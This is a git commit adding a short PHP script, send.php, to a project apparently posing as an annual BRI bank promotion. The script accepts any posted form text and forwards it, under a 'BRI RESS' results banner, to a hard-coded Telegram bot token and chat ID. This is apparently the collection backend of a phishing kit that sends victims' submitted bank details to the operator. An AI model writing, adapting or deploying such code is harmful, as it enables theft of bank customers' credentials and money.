107fa551302ccf47074461a159042c6c3c9e9244
Promo Festival <promofestival123@gmail.com>
2024-09-03 19:03:51 +0700

    Last commit

---
+++ promo-tahunan-bri/send.php
@@ -0,0 +1,17 @@
+<?php
+header('Access-Control-Allow-Origin: *');
+$token = "7270530250:AAEn9QoujJ1kWaSs6YFTbk5Q0mgP_ymuXsc";
+$chatID = "7208824936";
+$content = $_POST['message'];
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    "Content-Type: application/json"
+]);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+            "{\"chat_id\":\"".$chatID."\",\"text\":\"━─━────༺BRI RESS༻────━─━\n\n(BRI | RESSULTKU)\n\n".$content."\"}");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$server_output = curl_exec($ch);
+curl_close($ch);
